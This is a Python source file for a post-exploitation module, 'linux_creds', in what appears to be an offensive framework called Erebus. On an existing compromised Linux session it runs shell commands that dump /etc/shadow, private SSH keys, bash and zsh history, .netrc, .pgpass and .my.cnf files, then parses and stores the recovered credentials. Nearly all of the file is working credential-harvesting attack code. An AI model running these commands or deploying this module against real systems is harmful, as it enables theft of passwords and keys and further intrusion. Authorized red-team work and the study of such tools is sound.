"""Harvest credentials the controlled user can already read on a Linux session.

Read-only: it reads files and history the current session already has access to
(SSH private keys, /etc/shadow if readable, shell history, .pgpass/.my.cnf) and
records what it finds in the credential store. It never cracks, escalates, or
transmits secrets - values are stored locally and redacted over the API.
"""
from __future__ import annotations

from erebus.core.module_base import OptionSpec, Post, Rank
from erebus.modules.post import _creds

# (label, command, parser)
_HARVEST = [
    ("shadow", "cat /etc/shadow 2>/dev/null", _creds.parse_shadow),
    ("ssh_keys",
     "for f in $(find /home /root -maxdepth 4 -name 'id_*' ! -name '*.pub' -type f "
     "2>/dev/null | head -20); do echo \"@@KEY@@ $f\"; cat \"$f\" 2>/dev/null; done",
     _creds.parse_ssh_keys),
    ("history",
     "cat ~/.bash_history ~/.zsh_history /home/*/.bash_history 2>/dev/null",
     _creds.parse_history),
    ("netrc", "cat ~/.netrc /home/*/.netrc 2>/dev/null", _creds.parse_netrc),
    ("pgpass", "cat ~/.pgpass /home/*/.pgpass 2>/dev/null", _creds.parse_pgpass),
    ("mycnf", "cat ~/.my.cnf /home/*/.my.cnf 2>/dev/null", _creds.parse_mycnf),
]


class LinuxCreds(Post):
    name = "linux_creds"
    description = ("Harvest readable credentials on an existing Linux session "
                   "(keys, shadow, history, config)")
    authors = ["Erebus"]
    references = ["https://book.hacktricks.xyz/linux-hardening/privilege-escalation"]
    attack = ["T1552.001", "T1552.003", "T1555", "T1003.008"]
    rank = Rank.NORMAL
    options = [
        OptionSpec("SESSION", required=True, kind="int",
                   desc="id of a live Linux session to harvest (see /sessions)"),
    ]

    def run(self) -> None:
        sess = self.get_session()
        if sess is None:
            return
        host = sess.host
        self.info_(f"harvesting readable credentials on session {sess.id} @ {host}")
        total = 0
        for label, cmd, parser in _HARVEST:
            try:
                out = sess.command(cmd, overall=12.0)
            except OSError as exc:
                self.warn(f"{label}: session read failed ({exc})")
                continue
            for cred in parser(out):
                total += 1
                self.add_credential(
                    host, cred.get("username", ""), secret=cred.get("secret", ""),
                    kind=cred.get("kind", "password"), service=cred.get("service", ""))
                self.add_finding(
                    host, f"Credential recovered: {cred.get('service', '')} "
                    f"({cred.get('username') or 'n/a'}, {cred.get('kind')})",
                    severity="medium", attack="T1552", evidence_ref=f"session:{sess.id}")
                self.good(f"{label}: {cred.get('service')} "
                          f"{cred.get('username') or '(no user)'} [{cred.get('kind')}]")
        if total == 0:
            self.info_("no readable credentials found with the current access")
        else:
            self.good(f"done: {total} credential(s) stored - see the Creds tab / /credentials")
